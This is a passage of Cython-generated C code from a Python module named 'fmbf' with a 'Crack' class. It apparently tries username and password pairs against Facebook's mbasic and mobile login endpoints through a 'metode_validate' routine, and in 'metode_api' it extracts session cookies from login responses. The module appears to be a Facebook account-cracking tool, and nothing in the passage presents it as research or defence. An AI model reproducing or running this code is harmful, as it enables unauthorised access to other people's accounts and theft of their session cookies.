                    __pyx_t_19 = __Pyx_PyObject_Call(__pyx_t_21, __pyx_t_24, NULL); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 265, __pyx_L17_except_error)
                    __Pyx_GOTREF(__pyx_t_19);
                    __Pyx_DECREF(__pyx_t_24); __pyx_t_24 = 0;
                  }
                  __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
                  __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;

                  
                  goto __pyx_L31;
                }

                
                __pyx_t_19 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_mtd); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 266, __pyx_L17_except_error)
                __Pyx_GOTREF(__pyx_t_19);
                __pyx_t_17 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_mbasic, __pyx_t_19, Py_EQ)); if (unlikely(__pyx_t_17 < 0)) __PYX_ERR(0, 266, __pyx_L17_except_error)
                __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
                __pyx_t_18 = (__pyx_t_17 != 0);
                if (__pyx_t_18) {

                  
                  __pyx_t_21 = __Pyx_PyObject_GetAttrStr(__pyx_v_fall, __pyx_n_s_submit); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 267, __pyx_L17_except_error)
                  __Pyx_GOTREF(__pyx_t_21);
                  __pyx_t_24 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_metode_validate); if (unlikely(!__pyx_t_24)) __PYX_ERR(0, 267, __pyx_L17_except_error)
                  __Pyx_GOTREF(__pyx_t_24);
                  if (unlikely(!__pyx_v_user)) { __Pyx_RaiseUnboundLocalError("user"); __PYX_ERR(0, 267, __pyx_L17_except_error) }
                  if (unlikely(!__pyx_v_pwx)) { __Pyx_RaiseUnboundLocalError("pwx"); __PYX_ERR(0, 267, __pyx_L17_except_error) }
                  __pyx_t_22 = NULL;
                  __pyx_t_20 = 0;
                  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_21))) {
                    __pyx_t_22 = PyMethod_GET_SELF(__pyx_t_21);
                    if (likely(__pyx_t_22)) {
                      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_21);
                      __Pyx_INCREF(__pyx_t_22);
                      __Pyx_INCREF(function);
                      __Pyx_DECREF_SET(__pyx_t_21, function);
                      __pyx_t_20 = 1;
                    }
                  }
                  #if CYTHON_FAST_PYCALL
                  if (PyFunction_Check(__pyx_t_21)) {
                    PyObject *__pyx_temp[5] = {__pyx_t_22, __pyx_t_24, __pyx_v_user, __pyx_v_pwx, __pyx_kp_s_mbasic_facebook_com};
                    __pyx_t_19 = __Pyx_PyFunction_FastCall(__pyx_t_21, __pyx_temp+1-__pyx_t_20, 4+__pyx_t_20); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 267, __pyx_L17_except_error)
                    __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
                    __Pyx_GOTREF(__pyx_t_19);
                    __Pyx_DECREF(__pyx_t_24); __pyx_t_24 = 0;
                  } else
                  #endif
                  #if CYTHON_FAST_PYCCALL
                  if (__Pyx_PyFastCFunction_Check(__pyx_t_21)) {
                    PyObject *__pyx_temp[5] = {__pyx_t_22, __pyx_t_24, __pyx_v_user, __pyx_v_pwx, __pyx_kp_s_mbasic_facebook_com};
                    __pyx_t_19 = __Pyx_PyCFunction_FastCall(__pyx_t_21, __pyx_temp+1-__pyx_t_20, 4+__pyx_t_20); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 267, __pyx_L17_except_error)
                    __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
                    __Pyx_GOTREF(__pyx_t_19);
                    __Pyx_DECREF(__pyx_t_24); __pyx_t_24 = 0;
                  } else
                  #endif
                  {
                    __pyx_t_23 = PyTuple_New(4+__pyx_t_20); if (unlikely(!__pyx_t_23)) __PYX_ERR(0, 267, __pyx_L17_except_error)
                    __Pyx_GOTREF(__pyx_t_23);
                    if (__pyx_t_22) {
                      __Pyx_GIVEREF(__pyx_t_22); PyTuple_SET_ITEM(__pyx_t_23, 0, __pyx_t_22); __pyx_t_22 = NULL;
                    }
                    __Pyx_GIVEREF(__pyx_t_24);
                    PyTuple_SET_ITEM(__pyx_t_23, 0+__pyx_t_20, __pyx_t_24);
                    __Pyx_INCREF(__pyx_v_user);
                    __Pyx_GIVEREF(__pyx_v_user);
                    PyTuple_SET_ITEM(__pyx_t_23, 1+__pyx_t_20, __pyx_v_user);
                    __Pyx_INCREF(__pyx_v_pwx);
                    __Pyx_GIVEREF(__pyx_v_pwx);
                    PyTuple_SET_ITEM(__pyx_t_23, 2+__pyx_t_20, __pyx_v_pwx);
                    __Pyx_INCREF(__pyx_kp_s_mbasic_facebook_com);
                    __Pyx_GIVEREF(__pyx_kp_s_mbasic_facebook_com);
                    PyTuple_SET_ITEM(__pyx_t_23, 3+__pyx_t_20, __pyx_kp_s_mbasic_facebook_com);
                    __pyx_t_24 = 0;
                    __pyx_t_19 = __Pyx_PyObject_Call(__pyx_t_21, __pyx_t_23, NULL); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 267, __pyx_L17_except_error)
                    __Pyx_GOTREF(__pyx_t_19);
                    __Pyx_DECREF(__pyx_t_23); __pyx_t_23 = 0;
                  }
                  __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
                  __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;

                  
                  goto __pyx_L31;
                }

                
                __pyx_t_19 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_mtd); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 268, __pyx_L17_except_error)
                __Pyx_GOTREF(__pyx_t_19);
                __pyx_t_18 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_mobile, __pyx_t_19, Py_EQ)); if (unlikely(__pyx_t_18 < 0)) __PYX_ERR(0, 268, __pyx_L17_except_error)
                __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
                __pyx_t_17 = (__pyx_t_18 != 0);
                if (__pyx_t_17) {

                  
                  __pyx_t_21 = __Pyx_PyObject_GetAttrStr(__pyx_v_fall, __pyx_n_s_submit); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 269, __pyx_L17_except_error)
                  __Pyx_GOTREF(__pyx_t_21);
                  __pyx_t_23 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_metode_validate); if (unlikely(!__pyx_t_23)) __PYX_ERR(0, 269, __pyx_L17_except_error)
                  __Pyx_GOTREF(__pyx_t_23);
                  if (unlikely(!__pyx_v_user)) { __Pyx_RaiseUnboundLocalError("user"); __PYX_ERR(0, 269, __pyx_L17_except_error) }
                  if (unlikely(!__pyx_v_pwx)) { __Pyx_RaiseUnboundLocalError("pwx"); __PYX_ERR(0, 269, __pyx_L17_except_error) }
                  __pyx_t_24 = NULL;
                  __pyx_t_20 = 0;
                  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_21))) {
                    __pyx_t_24 = PyMethod_GET_SELF(__pyx_t_21);
                    if (likely(__pyx_t_24)) {
                      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_21);
                      __Pyx_INCREF(__pyx_t_24);
                      __Pyx_INCREF(function);
                      __Pyx_DECREF_SET(__pyx_t_21, function);
                      __pyx_t_20 = 1;
                    }
                  }
                  #if CYTHON_FAST_PYCALL
                  if (PyFunction_Check(__pyx_t_21)) {
                    PyObject *__pyx_temp[5] = {__pyx_t_24, __pyx_t_23, __pyx_v_user, __pyx_v_pwx, __pyx_kp_s_m_facebook_com};
                    __pyx_t_19 = __Pyx_PyFunction_FastCall(__pyx_t_21, __pyx_temp+1-__pyx_t_20, 4+__pyx_t_20); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 269, __pyx_L17_except_error)
                    __Pyx_XDECREF(__pyx_t_24); __pyx_t_24 = 0;
                    __Pyx_GOTREF(__pyx_t_19);
                    __Pyx_DECREF(__pyx_t_23); __pyx_t_23 = 0;
                  } else
                  #endif
                  #if CYTHON_FAST_PYCCALL
                  if (__Pyx_PyFastCFunction_Check(__pyx_t_21)) {
                    PyObject *__pyx_temp[5] = {__pyx_t_24, __pyx_t_23, __pyx_v_user, __pyx_v_pwx, __pyx_kp_s_m_facebook_com};
                    __pyx_t_19 = __Pyx_PyCFunction_FastCall(__pyx_t_21, __pyx_temp+1-__pyx_t_20, 4+__pyx_t_20); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 269, __pyx_L17_except_error)
                    __Pyx_XDECREF(__pyx_t_24); __pyx_t_24 = 0;
                    __Pyx_GOTREF(__pyx_t_19);
                    __Pyx_DECREF(__pyx_t_23); __pyx_t_23 = 0;
                  } else
                  #endif
                  {
                    __pyx_t_22 = PyTuple_New(4+__pyx_t_20); if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 269, __pyx_L17_except_error)
                    __Pyx_GOTREF(__pyx_t_22);
                    if (__pyx_t_24) {
                      __Pyx_GIVEREF(__pyx_t_24); PyTuple_SET_ITEM(__pyx_t_22, 0, __pyx_t_24); __pyx_t_24 = NULL;
                    }
                    __Pyx_GIVEREF(__pyx_t_23);
                    PyTuple_SET_ITEM(__pyx_t_22, 0+__pyx_t_20, __pyx_t_23);
                    __Pyx_INCREF(__pyx_v_user);
                    __Pyx_GIVEREF(__pyx_v_user);
                    PyTuple_SET_ITEM(__pyx_t_22, 1+__pyx_t_20, __pyx_v_user);
                    __Pyx_INCREF(__pyx_v_pwx);
                    __Pyx_GIVEREF(__pyx_v_pwx);
                    PyTuple_SET_ITEM(__pyx_t_22, 2+__pyx_t_20, __pyx_v_pwx);
                    __Pyx_INCREF(__pyx_kp_s_m_facebook_com);
                    __Pyx_GIVEREF(__pyx_kp_s_m_facebook_com);
                    PyTuple_SET_ITEM(__pyx_t_22, 3+__pyx_t_20, __pyx_kp_s_m_facebook_com);
                    __pyx_t_23 = 0;
                    __pyx_t_19 = __Pyx_PyObject_Call(__pyx_t_21, __pyx_t_22, NULL); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 269, __pyx_L17_except_error)
                    __Pyx_GOTREF(__pyx_t_19);
                    __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;
                  }
                  __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
                  __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;

                  
                }
                __pyx_L31:;
                __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                goto __pyx_L16_exception_handled;
              }
              __pyx_L17_except_error:;

              
              __Pyx_XGIVEREF(__pyx_t_11);
              __Pyx_XGIVEREF(__pyx_t_12);
              __Pyx_XGIVEREF(__pyx_t_13);
              __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
              goto __pyx_L7_error;
              __pyx_L16_exception_handled:;
              __Pyx_XGIVEREF(__pyx_t_11);
              __Pyx_XGIVEREF(__pyx_t_12);
              __Pyx_XGIVEREF(__pyx_t_13);
              __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
              __pyx_L22_try_end:;
            }

            
          }
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          
        }
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        goto __pyx_L12_try_end;
        __pyx_L7_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
        __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
        __Pyx_XDECREF(__pyx_t_23); __pyx_t_23 = 0;
        __Pyx_XDECREF(__pyx_t_24); __pyx_t_24 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
         {
          __Pyx_AddTraceback("fmbf.Crack.sandi", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_5, &__pyx_t_2) < 0) __PYX_ERR(0, 232, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_1 = PyTuple_Pack(3, __pyx_t_3, __pyx_t_5, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 232, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_13 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_1, NULL);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 232, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_13);
          __pyx_t_17 = __Pyx_PyObject_IsTrue(__pyx_t_13);
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
          if (__pyx_t_17 < 0) __PYX_ERR(0, 232, __pyx_L9_except_error)
          __pyx_t_18 = ((!(__pyx_t_17 != 0)) != 0);
          if (__pyx_t_18) {
            __Pyx_GIVEREF(__pyx_t_3);
            __Pyx_GIVEREF(__pyx_t_5);
            __Pyx_XGIVEREF(__pyx_t_2);
            __Pyx_ErrRestoreWithState(__pyx_t_3, __pyx_t_5, __pyx_t_2);
            __pyx_t_3 = 0; __pyx_t_5 = 0; __pyx_t_2 = 0; 
            __PYX_ERR(0, 232, __pyx_L9_except_error)
          }
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          goto __pyx_L8_exception_handled;
        }
        __pyx_L9_except_error:;
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
        goto __pyx_L1_error;
        __pyx_L8_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
        __pyx_L12_try_end:;
      }
    }
     {
      {
        if (__pyx_t_4) {
          __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__59, NULL);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 232, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        }
        goto __pyx_L6;
      }
      __pyx_L6:;
    }
    goto __pyx_L35;
    __pyx_L3_error:;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    goto __pyx_L1_error;
    __pyx_L35:;
  }

  
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__60, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 270, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  

  
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_19);
  __Pyx_XDECREF(__pyx_t_21);
  __Pyx_XDECREF(__pyx_t_22);
  __Pyx_XDECREF(__pyx_t_23);
  __Pyx_XDECREF(__pyx_t_24);
  __Pyx_AddTraceback("fmbf.Crack.sandi", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_fall);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_pwx);
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XDECREF(__pyx_v_nama);
  __Pyx_XDECREF(__pyx_v_depan);
  __Pyx_XDECREF(__pyx_v_z);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}




static PyObject *__pyx_pw_4fmbf_5Crack_7metode_api(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds); 
static PyMethodDef __pyx_mdef_4fmbf_5Crack_7metode_api = {"metode_api", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_4fmbf_5Crack_7metode_api, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_4fmbf_5Crack_7metode_api(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_self = 0;
  PyObject *__pyx_v_user = 0;
  PyObject *__pyx_v_pwx = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("metode_api (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_self,&__pyx_n_s_user,&__pyx_n_s_pwx,0};
    PyObject* values[3] = {0,0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  3: values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
        CYTHON_FALLTHROUGH;
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_self)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_user)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("metode_api", 1, 3, 3, 1); __PYX_ERR(0, 272, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  2:
        if (likely((values[2] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_pwx)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("metode_api", 1, 3, 3, 2); __PYX_ERR(0, 272, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "metode_api") < 0)) __PYX_ERR(0, 272, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 3) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
      values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
    }
    __pyx_v_self = values[0];
    __pyx_v_user = values[1];
    __pyx_v_pwx = values[2];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("metode_api", 1, 3, 3, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 272, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("fmbf.Crack.metode_api", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_4fmbf_5Crack_6metode_api(__pyx_self, __pyx_v_self, __pyx_v_user, __pyx_v_pwx);

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_4fmbf_5Crack_10metode_api_2generator(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); 



static PyObject *__pyx_pf_4fmbf_5Crack_10metode_api_genexpr(PyObject *__pyx_self) {
  struct __pyx_obj_4fmbf___pyx_scope_struct_1_genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_4fmbf___pyx_scope_struct_1_genexpr *)__pyx_tp_new_4fmbf___pyx_scope_struct_1_genexpr(__pyx_ptype_4fmbf___pyx_scope_struct_1_genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_4fmbf___pyx_scope_struct_1_genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 286, __pyx_L1_error)
  } else {
    __Pyx_GOTREF(__pyx_cur_scope);
  }
  __pyx_cur_scope->__pyx_outer_scope = (struct __pyx_obj_4fmbf___pyx_scope_struct__metode_api *) __pyx_self;
  __Pyx_INCREF(((PyObject *)__pyx_cur_scope->__pyx_outer_scope));
  __Pyx_GIVEREF(__pyx_cur_scope->__pyx_outer_scope);
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_4fmbf_5Crack_10metode_api_2generator, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_Crack_metode_api_locals_genexpr, __pyx_n_s_fmbf); if (unlikely(!gen)) __PYX_ERR(0, 286, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  
  __pyx_L1_error:;
  __Pyx_AddTraceback("fmbf.Crack.metode_api.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF(((PyObject *)__pyx_cur_scope));
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_4fmbf_5Crack_10metode_api_2generator(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) 
{
  struct __pyx_obj_4fmbf___pyx_scope_struct_1_genexpr *__pyx_cur_scope = ((struct __pyx_obj_4fmbf___pyx_scope_struct_1_genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  Py_ssize_t __pyx_t_4;
  PyObject *(*__pyx_t_5)(PyObject *);
  PyObject *__pyx_t_6 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    case 1: goto __pyx_L6_resume_from_yield;
    default: 
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 286, __pyx_L1_error)
  if (unlikely(!__pyx_cur_scope->__pyx_outer_scope->__pyx_v_post)) { __Pyx_RaiseClosureNameError("post"); __PYX_ERR(0, 286, __pyx_L1_error) }
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_outer_scope->__pyx_v_post, __pyx_n_s_json); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 286, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 286, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Dict_GetItem(__pyx_t_1, __pyx_n_s_session_cookies); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 286, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (likely(PyList_CheckExact(__pyx_t_2)) || PyTuple_CheckExact(__pyx_t_2)) {
    __pyx_t_1 = __pyx_t_2; __Pyx_INCREF(__pyx_t_1); __pyx_t_4 = 0;
    __pyx_t_5 = NULL;
  } else {
    __pyx_t_4 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 286, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_5 = Py_TYPE(__pyx_t_1)->tp_iternext; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 286, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  for (;;) {
    if (likely(!__pyx_t_5)) {
      if (likely(PyList_CheckExact(__pyx_t_1))) {
        if (__pyx_t_4 >= PyList_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_2 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_4); __Pyx_INCREF(__pyx_t_2); __pyx_t_4++; if (unlikely(0 < 0)) __PYX_ERR(0, 286, __pyx_L1_error)
        #else
        __pyx_t_2 = PySequence_ITEM(__pyx_t_1, __pyx_t_4); __pyx_t_4++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 286, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
        #endif
      } else {
        if (__pyx_t_4 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_2 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_4); __Pyx_INCREF(__pyx_t_2); __pyx_t_4++; if (unlikely(0 < 0)) __PYX_ERR(0, 286, __pyx_L1_error)
        #else
        __pyx_t_2 = PySequence_ITEM(__pyx_t_1, __pyx_t_4); __pyx_t_4++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 286, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
        #endif
      }
    } else {
      __pyx_t_2 = __pyx_t_5(__pyx_t_1);
      if (unlikely(!__pyx_t_2)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 286, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_2);
    }
    __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_i);
    __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_i, __pyx_t_2);
    __Pyx_GIVEREF(__pyx_t_2);
    __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_Dict_GetItem(__pyx_cur_scope->__pyx_v_i, __pyx_n_s_name); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 286, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = PyNumber_Add(__pyx_t_2, __pyx_kp_s__61); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 286, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_Dict_GetItem(__pyx_cur_scope->__pyx_v_i, __pyx_n_s_value); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 286, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_6 = PyNumber_Add(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 286, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_r = __pyx_t_6;
    __pyx_t_6 = 0;
